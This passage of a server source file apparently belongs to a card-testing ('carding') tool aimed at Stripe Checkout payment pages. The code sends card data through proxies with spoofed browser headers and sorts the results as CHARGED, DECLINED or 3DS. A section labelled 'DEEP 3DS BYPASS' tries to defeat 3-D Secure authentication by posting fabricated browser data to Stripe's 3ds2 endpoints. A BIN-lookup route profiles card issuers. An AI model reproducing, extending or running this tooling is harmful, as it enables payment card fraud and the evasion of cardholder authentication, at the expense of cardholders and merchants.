        init_checksum: initChecksum || randomHex(32),
        js_checksum: jsChecksum,
        pxvid,
        passive_captcha_token: "",
        passive_captcha_ekey: siteKey || "",
        rv_timestamp: rvTimestamp,
        "client_attribution_metadata[client_session_id]": stripeJsId,
        "client_attribution_metadata[checkout_session_id]": sessionId,
        "client_attribution_metadata[merchant_integration_source]": "checkout",
        "client_attribution_metadata[merchant_integration_version]": "payment_link",
        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
        "client_attribution_metadata[checkout_config_id]": configId || "",
      };
      
      const confirmData = new URLSearchParams(confirmParams).toString();

      const step5 = await proxyRequest(`https://api.stripe.com/v1/payment_pages/${sessionId}/confirm`, {
        method: "POST",
        headers: buyStripeHeaders,
        body: confirmData,
        proxyUrl,
        timeout: 20000,
      });

      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);

      const detachPM = () => {
        proxyRequest(`https://api.stripe.com/v1/payment_methods/${pmId}/detach`, {
          method: "POST",
          headers: { ...buyStripeHeaders, "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({ key: pkLive }).toString(),
          proxyUrl,
          timeout: 8000,
        }).catch(() => {});
      };

      try {
        const confirmJson = JSON.parse(step5.body);

        if (confirmJson.error) {
          const errMsg = confirmJson.error.message || "Declined";
          const declineCode = confirmJson.error.decline_code || "";
          const charge = confirmJson.error.charge || "";
          const errLower = errMsg.toLowerCase();
          const isDecline = errLower.includes("declined") || declineCode;
          const isSessionExpired = errLower.includes("no longer") || errLower.includes("expired") || errLower.includes("already been") || errLower.includes("completed") || errLower.includes("not active") || errLower.includes("paid") || confirmJson.error.code === "resource_missing";
          detachPM();
          return res.json({
            card: data,
            status: isSessionExpired ? "SESSION_EXPIRED" : (isDecline ? "DECLINED" : "ERROR"),
            message: `${errMsg}${declineCode ? ` (${declineCode})` : ""}${charge ? ` [${charge}]` : ""}`,
            approved: false,
            gateway: "Stripe Checkout",
            time: elapsed,
            fingerprint: fpMeta || undefined,
            ipInfo,
            sessionExpired: isSessionExpired,
          });
        }

        const status = confirmJson.status || "";
        if (status === "succeeded" || status === "processing") {
          detachPM();
          return res.json({ card: data, status: "CHARGED", message: `Payment ${status}!`, approved: true, gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, chargeAmount: expectedAmount, currency, ipInfo });
        } else if (status === "complete") {
          detachPM();
          return res.json({ card: data, status: "CHARGED", message: "Payment complete!", approved: true, gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, chargeAmount: expectedAmount, currency, ipInfo });
        } else if (status === "requires_action" || (confirmJson.id && confirmJson.id.startsWith("ppage_"))) {
          // ===== DEEP 3DS BYPASS =====
          console.log("[3DS] Status:", status, "| PI:", !!confirmJson.payment_intent, "| SI:", !!confirmJson.setup_intent);
          let piId = "";
          let piClientSecret = "";
          let threeDsUrl = "";
          let sourceId = "";
          let hasNative3DS2 = false;

          // Extract from payment_intent in confirmJson
          if (confirmJson.payment_intent) {
            const pi = typeof confirmJson.payment_intent === "string" ? confirmJson.payment_intent : confirmJson.payment_intent;
            if (typeof pi === "object") {
              piId = pi.id || "";
              piClientSecret = pi.client_secret || "";
              if (pi.next_action) {
                if (pi.next_action.redirect_to_url?.url) threeDsUrl = pi.next_action.redirect_to_url.url;
                if (pi.next_action.use_stripe_sdk?.stripe_js) threeDsUrl = threeDsUrl || pi.next_action.use_stripe_sdk.stripe_js;
                if (pi.next_action.use_stripe_sdk?.three_d_secure_2_source) sourceId = pi.next_action.use_stripe_sdk.three_d_secure_2_source;
                if (pi.next_action.use_stripe_sdk?.source) sourceId = sourceId || pi.next_action.use_stripe_sdk.source;
                if (pi.next_action.use_stripe_sdk?.directory_server_encryption) hasNative3DS2 = true;
              }
            } else {
              piId = pi;
            }
          }

          // Also check for setup_intent (subscription mode)
          if (!piId && confirmJson.setup_intent) {
            const si = typeof confirmJson.setup_intent === "object" ? confirmJson.setup_intent : null;
            if (si) {
              piId = si.id || "";
              piClientSecret = si.client_secret || "";
              if (si.next_action) {
                if (si.next_action.redirect_to_url?.url) threeDsUrl = si.next_action.redirect_to_url.url;
                if (si.next_action.use_stripe_sdk?.stripe_js) threeDsUrl = threeDsUrl || si.next_action.use_stripe_sdk.stripe_js;
                if (si.next_action.use_stripe_sdk?.three_d_secure_2_source) sourceId = si.next_action.use_stripe_sdk.three_d_secure_2_source;
                if (si.next_action.use_stripe_sdk?.source) sourceId = sourceId || si.next_action.use_stripe_sdk.source;
                if (si.next_action.use_stripe_sdk?.directory_server_encryption) hasNative3DS2 = true;
              }
            }
          }

          // Try extracting from the confirm body (ppage response has nested intent)
          if (!piId && confirmJson.next_action) {
            if (confirmJson.next_action.redirect_to_url?.url) threeDsUrl = confirmJson.next_action.redirect_to_url.url;
            if (confirmJson.next_action.use_stripe_sdk?.stripe_js) threeDsUrl = threeDsUrl || confirmJson.next_action.use_stripe_sdk.stripe_js;
            if (confirmJson.next_action.use_stripe_sdk?.three_d_secure_2_source) sourceId = confirmJson.next_action.use_stripe_sdk.three_d_secure_2_source;
          }

          // Also look for source/three_ds in the raw body (only src_ prefix, not payatt_)
          const srcMatch = step5.body.match(/src_[A-Za-z0-9]+/);
          if (!sourceId && srcMatch) sourceId = srcMatch[0];
          if (sourceId && !sourceId.startsWith("src_")) sourceId = "";
          const piMatch = step5.body.match(/(pi|seti)_[A-Za-z0-9_]+_secret_[A-Za-z0-9_]+/);
          if (!piClientSecret && piMatch) piClientSecret = piMatch[0];
          if (!piId) {
            const piIdMatch = step5.body.match(/(pi|seti)_[A-Za-z0-9]+/);
            if (piIdMatch) piId = piIdMatch[0];
          }

          console.log("[3DS] Extracted: piId=", piId, "| sourceId=", sourceId, "| native3DS2=", hasNative3DS2, "| threeDsUrl=", threeDsUrl ? threeDsUrl.substring(0, 80) : "none");

          // Native 3DS2 (directory_server_encryption) requires browser fingerprinting — skip bypass
          if (hasNative3DS2 && !sourceId) {
            const bypassElapsed = ((Date.now() - startTime) / 1000).toFixed(2);
            detachPM();
            return res.json({ card: data, status: "3DS", message: "3DS Authentication Required (Native 3DS2)", approved: false, gateway: "Stripe Checkout", time: bypassElapsed, fingerprint: fpMeta || undefined, ipInfo });
          }

          let bypassSuccess = false;
          const stripeJsHeaders = { "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "User-Agent": ua };

          if (sourceId && pkLive) {
            try {
              const sourceResp = await proxyRequest(`https://api.stripe.com/v1/sources/${sourceId}?key=${pkLive}&client_secret=${piClientSecret || ""}`, {
                method: "GET",
                headers: { "Accept": "application/json", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "User-Agent": ua },
                proxyUrl, timeout: 10000,
              });
              const sourceData = JSON.parse(sourceResp.body);
              let authUrl = sourceData?.redirect?.url || sourceData?.three_d_secure?.authenticate_url || sourceData?.three_d_secure?.acs_url || "";

              console.log("[3DS] Source status:", sourceData.status, "| type:", sourceData.type, "| authUrl:", authUrl ? authUrl.substring(0, 100) : "none");

              if (authUrl) {
                const authResp = await proxyRequest(authUrl, {
                  method: "GET",
                  headers: { "Accept": "text/html,application/json,*/*", "User-Agent": ua },
                  proxyUrl, timeout: 10000,
                });
                const authBody = authResp.body || "";
                const isComplete = authBody.includes("complete") || authBody.includes("success") || authBody.includes("authenticated");
                const is3dsV2Challenge = authBody.includes("creq") || authBody.includes("CReq") || authBody.includes("challenge");
                console.log("[3DS] Auth URL response: len=", authBody.length, "complete=", isComplete, "challenge=", is3dsV2Challenge);

                if (isComplete && !is3dsV2Challenge) {
                  bypassSuccess = true;
                  console.log("[3DS] Frictionless flow — bypass succeeded");
                }

                if (!bypassSuccess) {
                  try {
                    const completeResp = await proxyRequest(`https://api.stripe.com/v1/3ds2/complete`, {
                      method: "POST",
                      headers: stripeJsHeaders,
                      body: new URLSearchParams({ source: sourceId, key: pkLive }).toString(),
                      proxyUrl, timeout: 8000,
                    });
                    const completeData = JSON.parse(completeResp.body);
                    console.log("[3DS] 3ds2/complete:", JSON.stringify(completeData).substring(0, 300));
                    if (completeData.state === "succeeded" || completeData.status === "chargeable" || !completeData.error) {
                      bypassSuccess = true;
                    }
                  } catch {}
                }
              }

              if (!bypassSuccess) {
                try {
                  const authPayload = new URLSearchParams({
                    source: sourceId,
                    browser: JSON.stringify({
                      fingerprintAttempted: false, fingerprintData: null, challengeWindowSize: null,
                      threeDSCompInd: "Y", browserJavaEnabled: false, browserJavascriptEnabled: true,
                      browserLanguage: "en-US", browserColorDepth: "24", browserScreenHeight: "1200",
                      browserScreenWidth: "1920", browserTZ: "-300", browserUserAgent: ua,
                    }),
                    "one_click_authn_device_support[challenged]": "false",
                    "one_click_authn_device_support[browserData][webAuthnSupport]": "false",
                    "one_click_authn_device_support[browserData][publicKeyCredentialCreationOptionsSupport]": "false",
                    "one_click_authn_device_support[browserData][browserName]": "Chrome",
                    "one_click_authn_device_support[browserData][browserVersion]": "131",
                    key: pkLive,
                  }).toString();
                  const auth2Resp = await proxyRequest(`https://api.stripe.com/v1/3ds2/authenticate`, {
                    method: "POST", headers: stripeJsHeaders, body: authPayload, proxyUrl, timeout: 10000,
                  });
                  const auth2Data = JSON.parse(auth2Resp.body);
                  console.log("[3DS] 3ds2/authenticate:", JSON.stringify(auth2Data).substring(0, 400));
                  if (auth2Data.state === "succeeded" || auth2Data.status === "complete" || (auth2Data.ares && auth2Data.ares.transStatus === "Y")) {
                    bypassSuccess = true;
                    console.log("[3DS] 3ds2/authenticate succeeded");
                  }
                  if (auth2Data.state === "failed" || (auth2Data.ares && (auth2Data.ares.transStatus === "N" || auth2Data.ares.transStatus === "R"))) {
                    const bypassElapsed = ((Date.now() - startTime) / 1000).toFixed(2);
                    detachPM();
                    return res.json({ card: data, status: "DECLINED", message: "3DS Authentication Failed (Rejected)", approved: false, gateway: "Stripe Checkout", time: bypassElapsed, fingerprint: fpMeta || undefined, ipInfo });
                  }
                } catch {}
              }
            } catch {}
          }

          // If bypass succeeded, try to retrieve the final status
          if (bypassSuccess && piId && pkLive) {
            try {
              await new Promise(r => setTimeout(r, 1500));
              const isSetup = piId.startsWith("seti_");
              const endpoint = isSetup ? `https://api.stripe.com/v1/setup_intents/${piId}` : `https://api.stripe.com/v1/payment_intents/${piId}`;
              const retrieveResp = await proxyRequest(`${endpoint}?key=${pkLive}&client_secret=${piClientSecret}`, {
                method: "GET",
                headers: { "Accept": "application/json", "Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/", "User-Agent": ua },
                proxyUrl, timeout: 10000,
              });
              const piData = JSON.parse(retrieveResp.body);
              const piStatus = piData.status || "";
              const bypassElapsed = ((Date.now() - startTime) / 1000).toFixed(2);
              if (piStatus === "succeeded" || piStatus === "processing") {
                detachPM();
                return res.json({ card: data, status: "CHARGED", message: `3DS Bypassed → Payment ${piStatus}!`, approved: true, gateway: "Stripe Checkout", time: bypassElapsed, fingerprint: fpMeta || undefined, chargeAmount: expectedAmount, currency, ipInfo });
              }
              if (piStatus === "requires_payment_method") {
                detachPM();
                return res.json({ card: data, status: "DECLINED", message: "3DS Failed → Card declined after authentication", approved: false, gateway: "Stripe Checkout", time: bypassElapsed, fingerprint: fpMeta || undefined, ipInfo });
              }
            } catch {}
          }

          const bypassElapsed = ((Date.now() - startTime) / 1000).toFixed(2);
          detachPM();
          return res.json({ card: data, status: "3DS", message: sourceId ? "3DS Challenge Required (bypass failed)" : "3DS Authentication Required", approved: false, gateway: "Stripe Checkout", time: bypassElapsed, fingerprint: fpMeta || undefined, ipInfo });
        } else {
          detachPM();
          return res.json({ card: data, status: "UNKNOWN", message: `Status: ${status || "unknown"}`, approved: false, gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
        }
      } catch {
        detachPM();
        return res.json({ card: data, status: "ERROR", message: "Invalid confirm response", gateway: "Stripe Checkout", time: elapsed, fingerprint: fpMeta || undefined, ipInfo });
      }
    } catch (err: any) {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
      return res.json({ card: data, status: "ERROR", message: err.message || "Request failed", approved: false, gateway: "Stripe Checkout", time: elapsed });
    }
  });

  app.post("/api/bin-lookup", async (req, res) => {
    try {
      const { bin } = req.body;
      if (!bin || typeof bin !== "string" || bin.replace(/\D/g, "").length < 6) {
        return res.status(400).json({ error: "Provide at least 6 digits for BIN lookup" });
      }

      const binDigits = bin.replace(/\D/g, "").substring(0, 8);

      if (binCache.has(binDigits)) {
        return res.json(binCache.get(binDigits));
      }

      const rapidApiKey = process.env.RAPIDAPI_KEY;
      if (!rapidApiKey) {
        return res.status(500).json({ error: "RAPIDAPI_KEY not configured" });
      }

      const response = await fetch("https://neutrinoapi-bin-lookup.p.rapidapi.com/bin-lookup", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "x-rapidapi-host": "neutrinoapi-bin-lookup.p.rapidapi.com",
          "x-rapidapi-key": rapidApiKey,
        },
        body: new URLSearchParams({ "bin-number": binDigits }),
      });

      const json = await response.json() as Record<string, any>;

      const result = {
        valid: json.valid ?? false,
        bin: json["bin-number"] || binDigits,
        cardBrand: json["card-brand"] || "",
        cardType: json["card-type"] || "",
        cardCategory: json["card-category"] || "",
        issuer: json["issuer"] || "",
        issuerWebsite: json["issuer-website"] || "",
        issuerPhone: json["issuer-phone"] || "",
        country: json["country"] || "",
        countryCode: json["country-code"] || "",
        currencyCode: json["currency-code"] || "",
        isPrepaid: json["is-prepaid"] ?? false,
        isCommercial: json["is-commercial"] ?? false,
      };

      binCache.set(binDigits, result);
      return res.json(result);
    } catch (err: any) {
      return res.status(500).json({ error: err.message || "BIN lookup failed" });
    }
  });

  return httpServer;
}
